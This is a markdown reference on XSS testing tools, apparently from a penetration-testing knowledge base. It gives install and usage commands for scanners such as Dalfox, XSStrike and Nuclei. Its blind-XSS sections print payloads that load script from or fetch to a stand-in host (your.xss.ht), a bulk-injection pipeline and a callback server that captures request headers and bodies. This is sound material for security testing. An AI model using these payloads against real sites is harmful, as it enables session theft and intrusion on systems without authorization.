# 34 - XSS Testing Tools

## Overview

This document catalogs the essential tools for cross-site scripting (XSS) discovery, validation, and exploitation. Tools are organized by category: automated scanners, manual testing utilities, blind XSS platforms, and parameter discovery aids. Each entry includes installation, key features, and practical command examples.

---

## 1. Automated XSS Scanners

### 1.1 Dalfox

Dalfox is a powerful open-source XSS scanner written in Go, focused on automation with parameter analysis, static analysis, and a built-in payload engine.

**Source**: [https://github.com/hahwul/dalfox](https://github.com/hahwul/dalfox)
**Documentation**: [https://dalfox.hahwul.com/](https://dalfox.hahwul.com/)

**Installation**:
```bash
# Go install
go install github.com/hahwul/dalfox/v2@latest

# Homebrew
brew install dalfox

# Snap
sudo snap install dalfox
```

**Core Features**:
- Parameter analysis and mining from multiple sources
- Reflected, stored, and DOM-based XSS detection
- BAV (Basic Another Vulnerability) analysis for open redirects, SSTI, CRLF
- Custom payload injection and remote payload loading
- Headless browser-based verification for DOM XSS
- Pipeline mode for integration with other tools
- Server mode exposing a REST API

**Basic Usage**:
```bash
# Single URL scan
dalfox url "https://target.com/search?q=test"

# Scan from file
dalfox file urls.txt

# Pipeline mode (stdin)
cat urls.txt | dalfox pipe

# With custom headers and cookies
dalfox url "https://target.com/search?q=test" \
  -H "Authorization: Bearer TOKEN" \
  --cookie "session=abc123"
```

**Advanced Options**:
```bash
# Deep DOM XSS testing (slower but more thorough)
dalfox url "https://target.com/page?input=test" --deep-domxss

# Force headless browser verification
dalfox url "https://target.com/page?input=test" --force-headless-verification

# Custom payloads only
dalfox url "https://target.com/?q=test" \
  --custom-payload payloads.txt --only-custom-payload

# Remote payload sources
dalfox url "https://target.com/?q=test" \
  --remote-payloads "portswigger,payloadbox"

# Mining parameters from common sources
dalfox url "https://target.com/" --mining-dict --mining-dom

# Output to file with JSON format
dalfox url "https://target.com/?q=test" -o results.json --format json

# Proxy through Burp
dalfox url "https://target.com/?q=test" --proxy http://127.0.0.1:8080

# Set concurrency and delay
dalfox file urls.txt -w 50 --delay 100

# Ignore specific HTTP status codes
dalfox url "https://target.com/?q=test" --ignore-return "302,403,404"

# Use config file
dalfox url "https://target.com/?q=test" --config config.json
```

**Pipeline Integration Example**:
```bash
# Full recon-to-XSS pipeline
subfinder -d target.com -silent | \
  httpx -silent | \
  katana -silent | \
  dalfox pipe --deep-domxss -o xss_results.txt

# ParamSpider + Dalfox
paramspider -d target.com --output params.txt
cat params.txt | dalfox pipe -b your.xss.ht
```

### 1.2 XSStrike

XSStrike is the most advanced XSS scanner, featuring context-aware payload generation, intelligent fuzzing, and WAF detection/bypass.

**Source**: [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)

**Installation**:
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
```

**Key Features**:
- Context-aware payload generation (first scanner to generate its own payloads)
- Intelligent fuzzing engine with reflection analysis
- WAF detection and fingerprinting
- DOM XSS scanning via browser simulation
- Crawling with parameter discovery
- Support for POST data, custom headers, multipart forms

**Usage**:
```bash
# Basic reflected XSS scan
python3 xsstrike.py -u "https://target.com/search?q=test"

# Crawl and scan
python3 xsstrike.py -u "https://target.com" --crawl -l 3

# POST data
python3 xsstrike.py -u "https://target.com/login" \
  --data "username=test&password=test"

# DOM XSS scan
python3 xsstrike.py -u "https://target.com/page" --dom

# Fuzzing mode
python3 xsstrike.py -u "https://target.com/search?q=test" --fuzzer

# With custom headers
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --headers "Authorization: Bearer TOKEN"

# Blind XSS mode
python3 xsstrike.py -u "https://target.com/search?q=test" \
  --blind --param q

# Skip DOM scanning
python3 xsstrike.py -u "https://target.com/?q=test" --skip-dom

# Encode payloads
python3 xsstrike.py -u "https://target.com/?q=test" -e base64
```

**Bypass Techniques Built-In**:
- URL encoding, HTML encoding, JavaScript encoding
- Base64, hex, unicode encoding
- Payload mutation and case-variation
- Context-specific tag/event handler selection
- Automatic WAF fingerprinting and evasion

### 1.3 kxss

A fast Go-based tool that identifies parameters reflecting unfiltered characters, acting as a pre-filter for XSS testing.

**Source**: [https://github.com/tomnomnom/hacks/tree/master/kxss](https://github.com/tomnomnom/hacks/tree/master/kxss)

**Installation**:
```bash
go install github.com/tomnomnom/hacks/kxss@latest
```

**Usage**:
```bash
# Basic reflection check
echo "https://target.com/search?q=test" | kxss

# Pipeline with URL discovery
cat urls.txt | kxss

# Combined with gau
gau target.com | kxss

# Full recon chain
subfinder -d target.com -silent | httpx -silent | \
  katana -silent | kxss | tee reflected_params.txt
```

**Output Interpretation**:
- Reports which characters reflect unfiltered (e.g., `<`, `>`, `"`, `'`)
- Does NOT confirm XSS; confirms reflection of dangerous characters
- Use as a filter before running Dalfox or XSStrike on confirmed reflections

### 1.4 KNOXSS

A commercial online XSS scanner with near-zero false positive rate that provides proof-of-concept (PoC) for every finding.

**Source**: [https://knoxss.pro/](https://knoxss.pro/)
**Guide**: [https://medium.com/@Alra3ees/knoxss-for-dummies-a-new-detailed-guide-to-use-knoxss-pro-in-real-world-585cbfe16063](https://medium.com/@Alra3ees/knoxss-for-dummies-a-new-detailed-guide-to-use-knoxss-pro-in-real-world-585cbfe16063)

**Features**:
- Detects reflected, stored, and DOM-based XSS
- Proves exploitability by triggering alert box (near-zero false positives)
- Flash Mode for quick polyglot-based testing
- API with 5000 requests/24hr rate limit
- Covers source-based and DOM-based vectors
- CheckPoC feature for manual PoC validation

**API Usage**:
```bash
# Using knoxsser automation script
# Source: https://github.com/0xPugal/knoxsser
./knoxsser.sh -i urls.txt -X "KNOXSS_API_KEY" -o results.txt

# Using VulnKnox (Go wrapper)
vulnknox -u "https://target.com/search?q=test" -k "API_KEY"
```

### 1.5 XSSer

A penetration testing framework for detecting, exploiting, and reporting XSS vulnerabilities. Bundled with Kali Linux.

**Source**: [https://github.com/epsylon/xsser](https://github.com/epsylon/xsser)
**Kali Docs**: [https://www.kali.org/tools/xsser/](https://www.kali.org/tools/xsser/)

**Usage**:
```bash
# Auto scan
xsser -u "https://target.com/search?q=XSS"

# With specific payload
xsser -u "https://target.com/search?q=XSS" \
  --payload "<script>alert(1)</script>"

# Crawl and scan
xsser -u "https://target.com" -c 100 --auto

# POST method
xsser -u "https://target.com/form" -p "name=XSS&comment=XSS"

# With authentication
xsser -u "https://target.com/?q=XSS" \
  --cookie "session=abc123"

# Encoding options
xsser -u "https://target.com/?q=XSS" --Str  # String substitution
xsser -u "https://target.com/?q=XSS" --Une  # URL encoding
xsser -u "https://target.com/?q=XSS" --Hex  # Hex encoding
```

### 1.6 Nuclei XSS Templates

ProjectDiscovery's Nuclei scanner with community-curated XSS detection templates.

**Source**: [https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
**Blog**: [https://projectdiscovery.io/blog/simplifying-xss-detection-with-nuclei](https://projectdiscovery.io/blog/simplifying-xss-detection-with-nuclei)

**Usage**:
```bash
# Scan with all XSS templates
nuclei -l urls.txt -tags xss

# Specific XSS template categories
nuclei -l urls.txt -t dast/vulnerabilities/xss/
nuclei -l urls.txt -t http/vulnerabilities/ -tags xss

# Headless mode for DOM XSS (runs JavaScript)
nuclei -l urls.txt -headless -tags xss

# Exclude XSS from broader scan
nuclei -l urls.txt -t cves/ -etags xss

# Custom XSS template
nuclei -l urls.txt -t custom-xss-template.yaml

# With rate limiting
nuclei -l urls.txt -tags xss -rl 50 -c 10
```

**Custom XSS Template Example** (DOM XSS detection):
```yaml
id: custom-dom-xss
info:
  name: Custom DOM XSS Check
  severity: high
  tags: xss,dom
headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}?q=nuclei<img/src=x onerror=alert(1)>"
      - action: waitdialog
        args:
          type: alert
          timeout: 5
```

### 1.7 ParamSpider

Mines URLs with parameters from web archives for parameter discovery.

**Source**: [https://github.com/devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider)

**Installation**:
```bash
pip install paramspider
# or
git clone https://github.com/devanshbatham/ParamSpider.git
cd ParamSpider && pip install .
```

**Usage**:
```bash
# Basic parameter discovery
paramspider -d target.com

# With output file
paramspider -d target.com --output params.txt

# Exclude specific extensions
paramspider -d target.com --exclude woff,css,js,png,jpg,svg

# Full XSS discovery pipeline
paramspider -d target.com --output params.txt && \
  cat params.txt | dalfox pipe -b your.xss.ht
```

---

## 2. Manual Testing Tools

### 2.1 Browser DevTools

Every modern browser includes developer tools essential for XSS testing.

**Key Workflows**:
```
Console Tab:
- Test JavaScript execution: document.cookie, alert(1)
- Monitor DOM changes: MutationObserver
- Inspect event listeners on elements

Elements Tab:
- Search for reflected input (Ctrl+F in source)
- Inspect DOM modifications in real time
- Edit HTML to test injection points

Network Tab:
- Monitor request/response for reflected values
- Examine headers for injection opportunities
- Trace AJAX/fetch calls for DOM XSS sources

Sources Tab:
- Set breakpoints on dangerous sinks (innerHTML, setTimeout)
- Trace data flow from sources to sinks
- Debug JavaScript execution
```

**Chrome-Specific DOM XSS Debugging**:
```javascript
// Monitor dangerous sinks in Console
const origInnerHTML = Object.getOwnPropertyDescriptor(
  Element.prototype, 'innerHTML'
);
Object.defineProperty(Element.prototype, 'innerHTML', {
  set: function(value) {
    console.trace('innerHTML set:', value);
    return origInnerHTML.set.call(this, value);
  }
});
```

### 2.2 Burp Suite XSS Scanning

See File 36 (36-burp-integration.md) for comprehensive Burp Suite XSS coverage.

**Quick Reference**:
```
Active Scan: Right-click request > Scan > Active audit
Intruder: Right-click > Send to Intruder > Set payload positions > Load XSS wordlist
Repeater: Right-click > Send to Repeater > Manual payload testing
```

### 2.3 OWASP ZAP

Open-source alternative to Burp Suite with built-in XSS scanning.

**Source**: [https://www.zaproxy.org/](https://www.zaproxy.org/)

**Usage**:
```bash
# Automated scan
zap-cli quick-scan -s xss "https://target.com"

# Active scan with XSS policy
zap-cli active-scan --scanpolicyname "XSS" "https://target.com"

# API-driven scan
curl "http://localhost:8080/JSON/ascan/action/scan/?url=https://target.com&recurse=true&scanPolicyName=XSS"

# Docker-based scan
docker run -t zaproxy/zap-stable zap-baseline.py \
  -t https://target.com -r report.html
```

### 2.4 HackBar Browser Extension

Browser extension for quick XSS payload testing directly in the URL bar.

**Features**:
- Quick encoding/decoding (URL, Base64, HTML entities)
- Built-in XSS payload library
- POST data manipulation
- Hash and encoding utilities
- Available for Firefox and Chrome

---

## 3. Blind XSS Tools

### 3.1 XSS Hunter (xsshunter-express)

Self-hosted blind XSS tracking platform with rich context capture.

**Source**: [https://github.com/trufflesecurity/xsshunter](https://github.com/trufflesecurity/xsshunter)
**Guide**: [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

**Features**:
- Full page screenshot capture via HTML5 canvas API
- Complete DOM capture of the page at execution time
- Cookie and HTTP header collection
- Payload correlation (tracks which payload fired)
- Automatic TLS/SSL via Let's Encrypt
- Docker-based deployment (under 5 minutes)

**Setup**:
```bash
# Clone and deploy
git clone https://github.com/trufflesecurity/xsshunter.git
cd xsshunter

# Configure environment
cp .env.example .env
# Edit .env with your domain, email, and settings

# Deploy with Docker
docker-compose up -d
```

**Payload Injection**:
```html
<!-- Basic blind XSS probe -->
"><script src=//your.xss.ht></script>

<!-- Image-based probe -->
"><img src=x onerror="fetch('https://your.xss.ht')">

<!-- SVG-based probe -->
"><svg/onload=fetch('//your.xss.ht')>
```

**Common Injection Points for Blind XSS**:
```
- Contact forms (name, email, subject, message fields)
- User-Agent header
- Referer header
- Feedback/support ticket systems
- Admin panel log viewers
- Error logging systems
- User profile fields (display name, bio)
- File upload filenames
- API request bodies
```

### 3.2 Bxss

Go-based blind XSS injector that tests parameters and custom headers.

**Source**: [https://github.com/ethicalhackingplayground/bxss](https://github.com/ethicalhackingplayground/bxss)

**Installation**:
```bash
go install github.com/ethicalhackingplayground/bxss@latest
```

**Usage**:
```bash
# Basic blind XSS injection
cat urls.txt | bxss -payload '"><script src=//your.xss.ht></script>'

# Inject into headers
cat urls.txt | bxss -payload '"><script src=//your.xss.ht></script>' \
  -header "User-Agent"

# Custom parameters
cat urls.txt | bxss -payload '"><script src=//your.xss.ht></script>' \
  -parameters "name,email,comment"

# With concurrency
cat urls.txt | bxss -payload '"><script src=//your.xss.ht></script>' \
  -concurrency 50
```

### 3.3 Custom Blind XSS Server

Minimal callback server for blind XSS detection without full platform.

```python
#!/usr/bin/env python3
"""Minimal blind XSS callback server."""
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import json, ssl, sys

class BlindXSSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        data = {
            "timestamp": str(datetime.now()),
            "path": self.path,
            "headers": dict(self.headers),
            "client": self.client_address[0]
        }
        with open("blind_xss_hits.json", "a") as f:
            f.write(json.dumps(data) + "\n")
        print(f"[BLIND XSS HIT] {data['timestamp']} from {data['client']}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"/* callback received */")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode()
        data = {
            "timestamp": str(datetime.now()),
            "path": self.path,
            "headers": dict(self.headers),
            "body": body,
            "client": self.client_address[0]
        }
        with open("blind_xss_hits.json", "a") as f:
            f.write(json.dumps(data) + "\n")
        print(f"[BLIND XSS HIT] {data['timestamp']} - POST data received")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

server = HTTPServer(("0.0.0.0", 8443), BlindXSSHandler)
print("Blind XSS callback server running on :8443")
server.serve_forever()
```

### 3.4 Burp Collaborator

Burp Suite Professional's out-of-band interaction detection for blind XSS.

**Workflow**:
```
1. Generate Collaborator payload: Burp > Collaborator > Copy to clipboard
2. Inject payload: "><script src=//COLLAB_DOMAIN></script>
3. Monitor Collaborator tab for DNS/HTTP interactions
4. Correlate interactions with injection points
```

---

## 4. Supporting & Utility Tools

### 4.1 Gxss

Checks URLs for reflecting parameters with custom probe strings.

**Source**: [https://github.com/KathanP19/Gxss](https://github.com/KathanP19/Gxss)

```bash
go install github.com/KathanP19/Gxss@latest
cat urls.txt | Gxss -p "v0rt3x<>\"'" | tee reflected.txt
```

### 4.2 Arjun

Hidden parameter discovery tool that brute-forces parameter names.

**Source**: [https://github.com/s0md3v/Arjun](https://github.com/s0md3v/Arjun)

```bash
arjun -u "https://target.com/endpoint" -m GET
arjun -u "https://target.com/endpoint" -m POST --json
arjun -u "https://target.com/endpoint" -w custom_params.txt
```

### 4.3 qsreplace

Replaces parameter values in URLs for bulk payload injection.

```bash
go install github.com/tomnomnom/qsreplace@latest
cat urls.txt | qsreplace '<script>alert(1)</script>' | \
  httpx -mc 200 -sr | grep '<script>alert(1)</script>'
```

### 4.4 freq

Identifies frequently occurring parameter names across many URLs.

```bash
cat urls.txt | freq | sort -rn | head -20
```

---

## 5. Tool Selection Matrix

| Scenario | Primary Tool | Secondary Tool |
|----------|-------------|---------------|
| Quick reflected XSS scan | Dalfox | kxss (pre-filter) |
| WAF-protected target | XSStrike | KNOXSS |
| Blind XSS at scale | XSS Hunter + Bxss | Burp Collaborator |
| DOM XSS detection | Dalfox (--deep-domxss) | Nuclei (headless) |
| Parameter discovery | ParamSpider | Arjun |
| CI/CD integration | Nuclei | Dalfox (server mode) |
| Manual deep testing | Burp Suite | OWASP ZAP |
| PoC confirmation | KNOXSS | Browser DevTools |

---

## References

- Dalfox GitHub: [https://github.com/hahwul/dalfox](https://github.com/hahwul/dalfox)
- Dalfox Documentation: [https://dalfox.hahwul.com/](https://dalfox.hahwul.com/)
- Dalfox Help Net Security: [https://www.helpnetsecurity.com/2025/02/26/dalfox-open-source-xss-scanner/](https://www.helpnetsecurity.com/2025/02/26/dalfox-open-source-xss-scanner/)
- XSStrike GitHub: [https://github.com/s0md3v/XSStrike](https://github.com/s0md3v/XSStrike)
- XSStrike Overview: [https://best-of-web.builder.io/library/s0md3v/XSStrike](https://best-of-web.builder.io/library/s0md3v/XSStrike)
- kxss Workflow Guide: [https://thelinuxcode.com/kxss-in-2026-a-practical-workflow-for-identifying-xssprone-parameters-and-reflection-patterns/](https://thelinuxcode.com/kxss-in-2026-a-practical-workflow-for-identifying-xssprone-parameters-and-reflection-patterns/)
- KNOXSS Official: [https://knoxss.pro/](https://knoxss.pro/)
- Nuclei Templates: [https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
- Nuclei XSS Blog: [https://projectdiscovery.io/blog/simplifying-xss-detection-with-nuclei](https://projectdiscovery.io/blog/simplifying-xss-detection-with-nuclei)
- ParamSpider GitHub: [https://github.com/devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider)
- XSS Hunter Express: [https://github.com/trufflesecurity/xsshunter](https://github.com/trufflesecurity/xsshunter)
- XSS Hunter Intigriti Guide: [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)
- Bxss GitHub: [https://github.com/ethicalhackingplayground/bxss](https://github.com/ethicalhackingplayground/bxss)
- Gxss GitHub: [https://github.com/KathanP19/Gxss](https://github.com/KathanP19/Gxss)
- Burp Suite Turbo Intruder: [https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
- DOM Invader: [https://portswigger.net/burp/documentation/desktop/tools/dom-invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
